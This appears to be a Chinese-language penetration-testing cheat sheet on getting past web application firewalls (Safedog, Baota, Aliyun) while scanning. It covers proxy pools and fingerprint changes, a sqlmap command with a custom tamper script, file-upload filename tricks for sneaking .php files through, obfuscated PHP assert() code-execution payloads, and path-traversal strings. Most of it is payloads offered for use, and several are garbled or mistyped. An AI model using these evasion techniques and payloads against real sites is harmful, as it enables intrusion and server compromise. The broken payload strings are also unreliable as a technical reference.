## 漏洞发现触发WAF点-针对xray, awvs等

1.扫描速度- (代理池，延迟，白名单等)
2.工具指纹- (特征修改，伪造模拟真实用户等)
3.漏洞Payload- (数据变异,数据加密，白名单等)

代理池Proxy_ _pool项 目搭建及使用解释
充钱代理池直接干safedog+BT+Aliyun探针
Safedog-awvs漏扫注入测试绕过延时，白名单
Aliyun_ _os(云盾)-awvs漏扫注入测试绕过-延时白名单
BT(baota)-awvs+xray漏扫Payload绕过延时被动
充钱代理池直接干Safedog+BT+AliyunOS漏洞发现

## SQI注入

如需sq1map注入修改us头及加入代理防cc拦截自写tamper模块
安全狗:参考之前payload
Aliyun:基本修改指纹即可
宝塔:匹配关键字外加/+等

```
sq1map --proxy="http://127.0.0.1:8080" --tamper="waf.py" --random-agent
```

## 文件上传

1.php截断参考前面上传wa f绕过payload

```
#Payload:
不量垃圾数据缓冲溢出(Content-Disposition, filename等)
filename=x-php
filenane="x. php
filename='x.php
filanane="a.jpg; .php";
filename="a.php80D.jpg"
filename="Consent- -Diaposition: form-data;
name="upload_ ile" ;x.php" 
filename="x. aPg"; filename="x.jpg"; ... . .filename="x.php";
filename="xxx/x-jpg" 
filename=
"
x
.
p
h
p
"

```



## Xss跨站

利用xsstrike绕过加上--timeout或--proxy绕过cc

## 其他集合

RCE:
加密加码绕过?算法可逆?关键字绕过?提交方法?各种测试!

```
txt=$y=str_replace('x','','pxhpxinxfo()') ;assert($y);&submit=8E688F8908E48BA8A4   //拼接，替换

txt=$x='asse';$xx=$REQUEST['x']$xx=$x.$xx;$y=str_replace('x',"'pxhpxinxfo0);$xx($y);&submit=96E6%8F%90%E4%BA%A4


txt=$hex='706870696e666f28293b jassert(pack("H*". $hex));&usubmit=9E6%8F%90%6E4%BA9%A4	//16进制
```

文件包含:没什么好说的就这几种

```
..\   ..../   ..\.\ 等
```

